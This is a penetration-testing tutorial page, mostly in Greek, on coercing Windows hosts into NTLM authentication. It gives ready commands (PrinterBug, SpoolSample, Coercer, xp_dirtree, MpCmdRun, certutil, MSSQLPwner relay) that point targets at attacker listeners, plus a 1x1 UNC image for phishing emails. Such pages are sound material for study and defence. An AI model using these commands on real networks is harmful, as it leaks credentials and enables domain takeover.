# Force NTLM Privileged Authentication

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) είναι μια **συλλογή** από **remote authentication triggers** γραμμένη σε C# χρησιμοποιώντας MIDL compiler για την αποφυγή εξαρτήσεων από 3rd party.

## Spooler Service Abuse

Αν η υπηρεσία _**Print Spooler**_ είναι **ενεργή,** μπορείς να χρησιμοποιήσεις κάποια ήδη γνωστά AD credentials για να **ζητήσεις** από τον print server του Domain Controller ένα **update** για νέα print jobs και απλώς να του πεις να **στείλει την ειδοποίηση σε κάποιο system**.\
Σημείωση: όταν ο printer στέλνει την ειδοποίηση σε ένα αυθαίρετο system, πρέπει να **αυθεντικοποιηθεί απέναντι** σε εκείνο το **system**. Επομένως, ένας attacker μπορεί να κάνει την υπηρεσία _**Print Spooler**_ να αυθεντικοποιηθεί απέναντι σε ένα αυθαίρετο system, και η υπηρεσία θα **χρησιμοποιήσει το computer account** σε αυτήν την authentication.

Under the hood, το κλασικό **PrinterBug** primitive abuses **`RpcRemoteFindFirstPrinterChangeNotificationEx`** over **`\\PIPE\\spoolss`**. Ο attacker πρώτα ανοίγει ένα printer/server handle και μετά δίνει ένα fake client name στο `pszLocalMachine`, έτσι ώστε το target spooler να δημιουργήσει ένα notification channel **πίσω προς το host που ελέγχει ο attacker**. Γι' αυτό το αποτέλεσμα είναι **outbound authentication coercion** αντί για direct code execution.\
Αν ψάχνεις για **RCE/LPE** στο ίδιο το spooler, δες το [PrintNightmare](printnightmare.md). Αυτή η σελίδα επικεντρώνεται σε **coercion και relay**.

### Finding Windows Servers on the domain

Using PowerShell, πάρε μια λίστα από Windows boxes. Οι servers συνήθως έχουν προτεραιότητα, οπότε ας εστιάσουμε εκεί:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Εντοπισμός Spooler services που ακούν

Χρησιμοποιώντας ένα ελαφρώς τροποποιημένο @mysmartlogin's (Vincent Le Toux's) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), δείτε αν το Spooler Service είναι ενεργό και ακούει:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Μπορείτε επίσης να χρησιμοποιήσετε το `rpcdump.py` στο Linux και να αναζητήσετε το πρωτόκολλο **MS-RPRN**:
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
Ή δοκίμασε γρήγορα hosts από Linux με **NetExec/CrackMapExec**:
```bash
nxc smb targets.txt -u user -p password -M spooler
```
Αν θέλετε να **enumerate coercion surfaces** αντί απλώς να ελέγξετε αν υπάρχει το spooler endpoint, χρησιμοποιήστε **Coercer scan mode**:
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
Αυτό είναι χρήσιμο επειδή η εμφάνιση του endpoint στο EPM σου λέει μόνο ότι το print RPC interface είναι καταχωρισμένο. Δεν εγγυάται ότι κάθε coercion method είναι προσβάσιμη με τα τρέχοντα privileges σου ή ότι ο host θα εκπέμψει ένα αξιοποιήσιμο authentication flow.

### Ζήτησε από την υπηρεσία να αυθεντικοποιηθεί απέναντι σε έναν αυθαίρετο host

Μπορείς να κάνεις compile το [SpoolSample from here](https://github.com/NotMedic/NetNTLMtoSilverTicket).
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
ή χρησιμοποιήστε [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) ή [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) αν είστε σε Linux
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
Με το **Coercer**, μπορείτε να στοχεύσετε απευθείας τα spooler interfaces και να αποφύγετε να μαντεύετε ποια RPC method είναι εκτεθειμένη:
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### Εξαναγκασμός HTTP αντί για SMB με WebClient

Το κλασικό PrinterBug συνήθως δίνει μια **SMB** authentication στο `\\attacker\share`, κάτι που παραμένει χρήσιμο για **capture**, **relay to HTTP targets** ή **relay where SMB signing is absent**.\
Ωστόσο, σε σύγχρονα περιβάλλοντα, το relaying **SMB to SMB** συχνά μπλοκάρεται από το **SMB signing**, οπότε οι operators συχνά προτιμούν να εξαναγκάσουν **HTTP/WebDAV** authentication αντί γι’ αυτό.

Αν ο target έχει τη service **WebClient** σε εκτέλεση, ο listener μπορεί να καθοριστεί σε μορφή που κάνει τα Windows να χρησιμοποιούν **WebDAV over HTTP**:
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
Αυτό είναι ιδιαίτερα χρήσιμο όταν γίνεται chaining με **`ntlmrelayx --adcs`** ή άλλους HTTP relay targets, επειδή αποφεύγει να βασίζεται στο SMB relayability της coerced connection. Η σημαντική προϋπόθεση είναι ότι το **WebClient πρέπει να τρέχει** στο θύμα για να λειτουργήσει η παραλλαγή HTTP/WebDAV.

### Συνδυασμός με Unconstrained Delegation

Αν ένας attacker έχει ήδη θέσει υπό έλεγχο έναν υπολογιστή με [Unconstrained Delegation](unconstrained-delegation.md), ο attacker θα μπορούσε να **κάνει τον printer να authenticate against this computer**. Λόγω του unconstrained delegation, το **TGT** του **computer account of the printer** θα αποθηκευτεί στη **memory** του υπολογιστή με unconstrained delegation. Εφόσον ο attacker έχει ήδη θέσει υπό έλεγχο αυτό το host, θα μπορεί να **retrieve this ticket** και να το abuse it ([Pass the Ticket](pass-the-ticket.md)).

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)

### RPC UNC-path coercion matrix (interfaces/opnums that trigger outbound auth)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Notes: asynchronous print interface on the same spooler pipe; use Coercer to enumerate reachable methods on a given host
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (also via \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce

Σημείωση: Αυτές οι μέθοδοι δέχονται παραμέτρους που μπορούν να μεταφέρουν ένα UNC path (π.χ. `\\attacker\share`). Όταν γίνει η επεξεργασία τους, τα Windows θα authenticate (machine/user context) σε αυτό το UNC, επιτρέποντας NetNTLM capture ή relay.\
Για spooler abuse, το **MS-RPRN opnum 65** παραμένει η πιο συνηθισμένη και καλύτερα τεκμηριωμένη primitive, επειδή η προδιαγραφή του πρωτοκόλλου δηλώνει ρητά ότι ο server δημιουργεί ένα notification channel πίσω προς τον client που καθορίζεται από το `pszLocalMachine`.

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: MS-EVEN over \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)
- Effect: ο target προσπαθεί να ανοίξει το παρεχόμενο backup log path και authenticates to the attacker-controlled UNC.
- Practical use: coerce Tier 0 assets (DC/RODC/Citrix/etc.) to emit NetNTLM, then relay to AD CS endpoints (ESC8/ESC11 scenarios) or other privileged services.

## PrivExchange

Το attack `PrivExchange` είναι αποτέλεσμα ενός flaw που βρέθηκε στο **Exchange Server `PushSubscription` feature**. Αυτό το feature επιτρέπει στον Exchange server να εξαναγκαστεί από οποιονδήποτε domain user με mailbox να authenticate to any client-provided host over HTTP.

By default, η **Exchange service runs as SYSTEM** και έχει δοθεί υπερβολικό privileges (συγκεκριμένα, έχει **WriteDacl privileges on the domain pre-2019 Cumulative Update**). Αυτό το flaw μπορεί να εκμεταλλευτεί για να επιτρέψει το **relaying of information to LDAP and subsequently extract the domain NTDS database**. Σε περιπτώσεις όπου το relaying to LDAP δεν είναι δυνατό, αυτό το flaw μπορεί ακόμα να χρησιμοποιηθεί για relay και authenticate to other hosts within the domain. Η επιτυχής εκμετάλλευση αυτού του attack δίνει άμεση πρόσβαση στο Domain Admin με οποιονδήποτε authenticated domain user account.

## Inside Windows

Αν βρίσκεστε ήδη μέσα στο Windows machine μπορείτε να αναγκάσετε τα Windows να connect to a server using privileged accounts με:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Ή χρησιμοποίησε αυτήν την άλλη τεχνική: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Είναι δυνατό να χρησιμοποιηθεί το certutil.exe lolbin (Microsoft-signed binary) για να εξαναγκαστεί NTLM authentication:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Μέσω email

Αν γνωρίζεις τη **διεύθυνση email** του χρήστη που συνδέεται σε ένα μηχάνημα που θέλεις να παραβιάσεις, θα μπορούσες απλώς να του στείλεις ένα **email με μια εικόνα 1x1** όπως
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
και όταν το ανοίξει, θα προσπαθήσει να αυθεντικοποιηθεί.

### MitM

Αν μπορείς να εκτελέσεις μια MitM attack σε έναν υπολογιστή και να κάνεις inject HTML σε μια σελίδα που θα δει, θα μπορούσες να δοκιμάσεις να κάνεις inject μια εικόνα όπως την ακόλουθη στη σελίδα:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Άλλοι τρόποι για να αναγκάσετε και να κάνετε phishing NTLM authentication


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Cracking NTLMv1

Αν μπορείτε να συλλάβετε [NTLMv1 challenges διαβάστε εδώ πώς να τα crackάρετε](../ntlm/index.html#ntlmv1-attack).\
_Θυμηθείτε ότι για να crackάρετε το NTLMv1 πρέπει να ορίσετε το challenge του Responder σε "1122334455667788"_

## References
- [Unit 42 – Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)

{{#include ../../banners/hacktricks-training.md}}
